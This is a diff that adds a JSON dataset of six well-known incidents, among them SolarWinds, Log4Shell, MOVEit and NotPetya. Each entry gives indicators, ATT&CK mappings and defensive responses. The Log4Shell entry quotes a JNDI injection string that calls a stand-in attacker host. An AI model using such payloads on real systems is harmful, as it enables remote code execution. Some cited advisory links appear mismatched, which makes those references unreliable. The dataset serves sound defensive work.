@@ -1,0 +1,203 @@
+[
+  {
+    "incident_id": "INC-2020-001",
+    "title": "SolarWinds Supply Chain Compromise (SUNBURST)",
+    "threat_actor": "UNC2452 / APT29 (Cozy Bear)",
+    "threat_category": "Supply Chain / Nation-State Cyber Espionage",
+    "publication_date": "2020-12-13",
+    "affected_environment": "Enterprise networks, US Federal Agencies, Fortune 500",
+    "observed_behavior": "Trojanized Orion software updates (SolarWinds.Orion.Core.BusinessLayer.dll) injected via supply chain compromise. The backdoor remained dormant for up to two weeks, retrieved and executed commands (transfer files, execute files, profile systems, reboot, disable system services), communicating via HTTP steganography disguised as legitimate Orion traffic.",
+    "indicators": [
+      "SolarWinds.Orion.Core.BusinessLayer.dll",
+      "avsvmcloud.com",
+      "d15e982d617477e77bd5ff76ee64f261901a052b"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1195.002",
+        "technique_name": "Supply Chain Compromise: Compromise Software Supply Chain"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols"
+      },
+      {
+        "technique_id": "T1027",
+        "technique_name": "Obfuscated/Compressed Files and Information"
+      },
+      {
+        "technique_id": "T1573.002",
+        "technique_name": "Encrypted Channel: Asymmetric Cryptography"
+      }
+    ],
+    "defensive_response": "1. Immediately isolate SolarWinds Orion servers (versions 2019.4 HF 5 through 2020.2.1).\n2. Block network ingress/egress to avsvmcloud.com and related C2 domains.\n3. Hunt for secondary SAML token forgery (Golden SAML) across Active Directory / Azure AD.\n4. Rebuild compromised hosts from trusted offline gold images.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a"
+  },
+  {
+    "incident_id": "INC-2021-002",
+    "title": "Colonial Pipeline Ransomware Incident (DarkSide)",
+    "threat_actor": "DarkSide Ransomware Group",
+    "threat_category": "Ransomware / Critical Infrastructure Extortion",
+    "publication_date": "2021-05-07",
+    "affected_environment": "Energy Pipeline Operational Technology (OT) and Billing IT Systems",
+    "observed_behavior": "Adversary gained initial access via compromised single-factor legacy VPN account credentials found on dark web leaks. Adversaries moved laterally, exfiltrated ~100GB of enterprise data within 2 hours, and deployed DarkSide ransomware targeting virtualized billing and IT infrastructure.",
+    "indicators": [
+      "DarkSide executable (hash: 1d2454f55a12150965d06fb6be13401b)",
+      "Tor negotiation portal .onion",
+      "Cobalt Strike beacon beacons on internal subnets"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1078.002",
+        "technique_name": "Valid Accounts: Domain Accounts"
+      },
+      {
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service"
+      }
+    ],
+    "defensive_response": "1. Enforce Multi-Factor Authentication (MFA) across all remote access entry points.\n2. Implement strict network segmentation between IT billing systems and pipeline OT networks.\n3. Validate immutable off-site backups with out-of-band recovery keys.\n4. Deploy endpoint detection and response (EDR) to detect privilege escalation and Cobalt Strike beacons.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-131a"
+  },
+  {
+    "incident_id": "INC-2021-003",
+    "title": "Apache Log4j Remote Code Execution Vulnerability (Log4Shell)",
+    "threat_actor": "Multiple Threat Actors / Widespread Exploitation",
+    "threat_category": "Zero-Day Remote Code Execution (RCE)",
+    "publication_date": "2021-12-10",
+    "affected_environment": "Global Java Web Applications, Cloud Services, Enterprise Loggers",
+    "observed_behavior": "Adversaries submit malicious JNDI lookup strings (${jndi:ldap://attacker[.]com/a} or ${jndi:rmi://...}) into HTTP User-Agent, URI parameters, or form fields. Log4j parses and evaluates the JNDI expression, initiating an outbound LDAP/RMI connection to attacker infrastructure and executing arbitrary Java class bytecode in the context of the logging application.",
+    "indicators": [
+      "CVE-2021-44228",
+      "${jndi:ldap://",
+      "${jndi:dns://",
+      "outbound LDAP port 389, 636, 1389 connections"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application"
+      },
+      {
+        "technique_id": "T1059.007",
+        "technique_name": "Command and Scripting Interpreter: JavaScript/Java"
+      },
+      {
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer"
+      }
+    ],
+    "defensive_response": "1. Upgrade Log4j to version 2.17.1 or later.\n2. Set log4j2.formatMsgNoLookups=true or remove JndiLookup.class from log4j-core JAR.\n3. Restrict egress traffic from application servers to prevent outbound LDAP/RMI lookups.\n4. Apply WAF inspection rules targeting JNDI string variants.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a"
+  },
+  {
+    "incident_id": "INC-2023-004",
+    "title": "MOVEit Transfer SQL Injection and Extortion Campaign (CL0P)",
+    "threat_actor": "CL0P / Lace Tempest (TA505)",
+    "threat_category": "Zero-Day Data Theft Extortion",
+    "publication_date": "2023-05-31",
+    "affected_environment": "Progress Software MOVEit Transfer Managed File Transfer (MFT) instances",
+    "observed_behavior": "Threat actor exploited a pre-authentication SQL injection flaw (CVE-2023-34362) in MOVEit Transfer web applications. This allowed attackers to gain unauthorized access, infer underlying database schema, deploy a specialized web shell (human2.aspx), and exfiltrate sensitive files without deploying encryption ransomware.",
+    "indicators": [
+      "CVE-2023-34362",
+      "human2.aspx",
+      "_human2.aspx",
+      "X-siLock-Session-Creation HTTP headers"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application"
+      },
+      {
+        "technique_id": "T1505.003",
+        "technique_name": "Server Software Component: Web Shell"
+      },
+      {
+        "technique_id": "T1567.002",
+        "technique_name": "Exfiltration to Cloud Storage"
+      }
+    ],
+    "defensive_response": "1. Immediately modify firewall rules to block all external HTTP/HTTPS traffic to MOVEit Transfer.\n2. Inspect C:\\MOVEitTransfer\\wwwroot for unauthorized human2.aspx files.\n3. Apply Progress Software security patches for CVE-2023-34362.\n4. Reset all active administrative credentials and service account secrets.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a"
+  },
+  {
+    "incident_id": "INC-2017-005",
+    "title": "WannaCry Cryptographic Worm Outbreak",
+    "threat_actor": "Lazarus Group (Subgroup Bluenoroff / Andariel)",
+    "threat_category": "Self-Propagating Ransomware Worm",
+    "publication_date": "2017-05-12",
+    "affected_environment": "Global Healthcare (NHS UK), Telecommunications, Windows legacy endpoints",
+    "observed_behavior": "Self-propagating worm that scanned internal subnets and the public Internet for vulnerable SMBv1 ports (TCP 445). Exploited EternalBlue (MS17-010) buffer overflow to inject DoublePulsar backdoor in ring 0 kernel space, followed by payload dropping, killswitch domain check (www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com), RSA/AES file encryption, and Bitcoin ransom demands.",
+    "indicators": [
+      "CVE-2017-0144 (EternalBlue)",
+      "MS17-010",
+      "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
+      "TCP 445 port scans",
+      ".wnry extension"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1210",
+        "technique_name": "Exploitation of Remote Services"
+      },
+      {
+        "technique_id": "T1486",
+        "technique_name": "Data Encrypted for Impact"
+      },
+      {
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery"
+      }
+    ],
+    "defensive_response": "1. Block TCP port 445 at perimeter and internal network firewalls.\n2. Disable legacy SMBv1 protocol enterprise-wide via Group Policy.\n3. Apply Microsoft Security Bulletin MS17-010 patch.\n4. Sinkhole killswitch domains to halt encryption routines on infected hosts.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa17-132a"
+  },
+  {
+    "incident_id": "INC-2017-006",
+    "title": "NotPetya / ExPetr Destructive Cyber Warfare Attack",
+    "threat_actor": "Sandworm Team / GRU Unit 74455",
+    "threat_category": "Destructive Wiper Disguised as Ransomware",
+    "publication_date": "2017-06-27",
+    "affected_environment": "Ukrainian financial/tax infrastructure, global logistics (Maersk, FedEx)",
+    "observed_behavior": "Initial infection via backdoored update of Ukrainian accounting software M.E.Doc. Once inside, malware extracted credentials from memory using modified Mimikatz, propagated rapidly via PsExec, WMIC, and EternalBlue (MS17-010). Overwrote Master Boot Record (MBR) and encrypted Master File Table (MFT) with unrecoverable XOR key, acting as a permanent destructive wiper.",
+    "indicators": [
+      "M.E.Doc update backdoor (ezvit.dll)",
+      "perfc.dat",
+      "EternalBlue SMB exploit",
+      "Compromised admin credentials via LSASS dumping"
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1195.002",
+        "technique_name": "Supply Chain Compromise"
+      },
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory"
+      },
+      {
+        "technique_id": "T1021.002",
+        "technique_name": "Remote Services: SMB/Windows Admin Shares"
+      },
+      {
+        "technique_id": "T1561.002",
+        "technique_name": "Disk Wipe: Disk Structure Wipe"
+      }
+    ],
+    "defensive_response": "1. Restrict administrative credential reuse across enterprise endpoints.\n2. Enforce Credential Guard and LSA Protection to prevent LSASS memory dumping.\n3. Isolate supply chain update mechanisms with binary hash verification.\n4. Maintain offline immutable bare-metal backup images for rapid domain rebuild.",
+    "source_url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa18-046a"
+  }
+]
